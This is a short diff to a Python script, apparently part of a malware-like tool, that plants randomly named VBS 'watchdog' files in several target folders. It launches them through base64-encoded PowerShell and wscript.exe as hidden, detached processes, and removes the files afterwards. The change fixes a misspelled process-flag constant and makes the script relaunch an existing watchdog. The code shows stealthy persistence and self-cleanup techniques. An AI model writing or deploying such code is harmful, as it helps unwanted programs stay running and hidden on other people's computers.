@@ -82,9 +82,9 @@ def deleteVbsFileAfterFinish():
             print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
 
 def create_watchdog_vbs():
-    script_final = vbs_template.format(script_python_path.replace("\\", "\\\\"))
+    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
     b64_vbs = base64.b64encode(script_final.encode()).decode()
-    DTACHED_PROCESS = 0x00000008
+    DETACHED_PROCESS = 0x00000008
     CREATE_NEW_PROCESS_GROUP = 0x00000200
 
     for folder in target_dirs:
@@ -100,7 +100,14 @@ def create_watchdog_vbs():
 
             if existing_vbs:
                 print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
-                continue
+                vbs_exist_path = os.path.join(folder, existing_vbs[0])
+                subprocess.Popen(
+        ["wscript.exe", vbs_exist_path],
+        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        stdin=subprocess.DEVNULL
+    )
 
             random_name = f"watchdog_{secrets.token_hex(4)}.vbs"
             vbs_path = os.path.join(folder, random_name)
@@ -119,7 +126,7 @@ def create_watchdog_vbs():
             subprocess.Popen(
                 powershell_command,
                 shell=True,
-                creationflags=DTACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
                 stdin=subprocess.DEVNULL
